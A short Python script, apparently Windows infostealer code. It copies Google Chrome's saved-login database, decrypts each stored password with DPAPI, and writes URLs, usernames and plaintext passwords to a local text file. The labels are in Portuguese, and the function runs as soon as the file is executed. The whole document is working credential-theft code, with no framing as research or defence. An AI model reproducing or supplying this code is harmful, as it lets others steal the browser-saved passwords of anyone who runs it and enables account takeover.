import sqlite3
import os
import shutil
import win32crypt
from win32crypt import CryptUnprotectData

def get_chrome_passwords():
    data_path = os.getenv('APPDATA') + r"\..\Local\Google\Chrome\User Data\Default\Login Data"
    shutil.copy2(data_path, "chrome_temp.db")
    conn = sqlite3.connect("chrome_temp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
    
    with open("passwords.txt", "w") as f:
        for row in cursor.fetchall():
            password = CryptUnprotectData(row[3])[1].decode('utf-8')
            f.write(f"URL: {row[0]}\nUsuário: {row[2]}\nSenha: {password}\n\n")

    os.remove("chrome_temp.db")

get_chrome_passwords()
